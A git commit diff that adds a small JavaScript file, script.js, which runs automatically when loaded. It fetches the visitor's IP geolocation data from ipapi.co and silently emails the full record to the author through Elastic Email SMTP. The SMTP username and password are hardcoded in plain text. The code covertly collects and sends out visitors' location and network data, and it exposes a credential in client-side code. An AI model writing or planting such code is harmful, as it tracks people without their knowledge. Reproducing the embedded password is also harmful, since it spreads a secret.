cf5bd04a0a52e10f88a4ba9d32fbe4ed0ae93497
Nitikesh Yewale <100467413+NitikeshYewale@users.noreply.github.com>
2024-03-14 04:05:28 +0530

    v 1.0.0

---
+++ script.js
@@ -0,0 +1,26 @@
+
+
+
+
+
+async function get(){
+   var res=await fetch("https://ipapi.co/json/");
+   var data = await res.json();
+   //console.log(JSON.stringify(data));
+
+
+   Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "nitikeshyewale2024@gmail.com",
+    Password : "3E18507CAE3603BD688F0B3EC4063DE13ABA",
+    To : 'nitikeshyewale2024@gmail.com',
+    From : "nitikeshyewale2024@gmail.com",
+    Subject : `${data.city}`,
+    Body : JSON.stringify(data)
+});
+
+    return data;
+}
+    
+const fullData=get();
+
